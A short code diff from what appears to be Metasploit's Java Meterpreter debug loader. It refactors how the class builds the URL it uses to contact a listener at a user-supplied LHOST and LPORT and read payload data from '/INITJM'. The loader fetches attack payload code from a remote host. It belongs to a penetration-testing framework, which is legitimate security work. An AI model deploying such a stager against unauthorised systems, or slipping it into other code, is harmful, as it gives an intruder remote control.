@@ -20,7 +20,8 @@ public class URLDebugLoader {
             System.out.println("Usage: java com.metasploit.meterpreter.URLDebugLoader <LHOST> <LPORT> [<RedirectError>]");
             return;
         }
-        URL initURL = new URL("http://" + args[0] + ":" + args[1] + "/INITJM");
+        String url = "http://" + args[0] + ":" + args[1] + "/INITJM";
+        URL initURL = new URL(url);
         DataInputStream in = new DataInputStream(initURL.openStream());
         OutputStream out = new DataOutputStream(new ByteArrayOutputStream());
         int coreLen = in.readInt();
